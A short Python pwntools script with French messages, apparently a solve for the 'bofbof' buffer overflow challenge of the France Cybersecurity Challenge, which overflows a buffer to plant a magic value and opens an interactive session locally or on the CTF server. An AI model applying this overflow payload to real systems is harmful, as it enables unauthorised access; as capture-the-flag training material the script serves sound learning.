#!/usr/bin/env python
# coding: utf-8

import pwn
import argparse
import os

# pwn.context.log_level = "debug"
shell = "challenges2.france-cybersecurity-challenge.fr"
port = 4002
winArg = 0x1122334455667788
charge = pwn.cyclic(0x20 + 8)
payload = charge + pwn.p64(winArg)
binary = os.path.join(os.path.dirname(__file__), "bofbof.py")


def startExploit(isOnline):
    try:
        if isOnline:
            Online()
        else:
            Local()
    except Exception as e:
        pwn.error(f"Une erreur est survenue : {str(e)}")
    finally:
        pwn.info("Le programme a terminé son exécution.")


def Local():
    pwn.context.binary = binary
    pwn.info("Exécution en mode local...")
    stdout = pwn.process.PTY
    stdin = pwn.process.PTY
    target = pwn.process([binary], stdout=stdout, stdin=stdin)
    target.sendlineafter(">>>", payload)
    target.interactive()


def Online():
    pwn.info("Exécution en mode en ligne...")
    conn = pwn.remote(shell, port)
    conn.recvline()
    conn.sendlineafter(">>>", payload)
    conn.interactive()


def main():
    parser = argparse.ArgumentParser(
        description="Exécuter bofbof en ligne ou localement", prog="bofbof.py"
    )
    parser.add_argument(
        "-o",
        "--online",
        dest="isOnline",
        help="Exécuter en mode en ligne",
        action="store_true",
        default=False,
    )
    args = parser.parse_args()
    if args.isOnline:
        Online()
    else:
        Local()


if __name__ == "__main__":
    main()
